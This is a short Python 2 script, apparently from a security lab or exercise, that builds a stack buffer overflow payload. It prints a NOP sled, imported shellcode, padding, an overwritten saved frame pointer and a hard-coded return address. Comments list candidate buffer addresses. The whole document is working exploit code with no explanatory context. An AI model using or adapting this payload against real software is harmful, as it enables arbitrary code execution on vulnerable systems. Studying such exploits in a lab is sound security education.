from shellcode import shellcode
ebp = ("\x90\x90\x90\x90")
ret = ("\xa0\xf5\xfe\xbf")
str1 = chr(0x90) * 800 + shellcode + chr(0x90) * (1024 - 800 - len(shellcode) + 8)
print str1 + ebp + ret

# possible buf start addr: 0xbffef500, 0xbffef4d0 0xbffef560,    0xbffef4a0 - 0xbffef5a0
# ebp 0xbffef900	ret	0x08049005
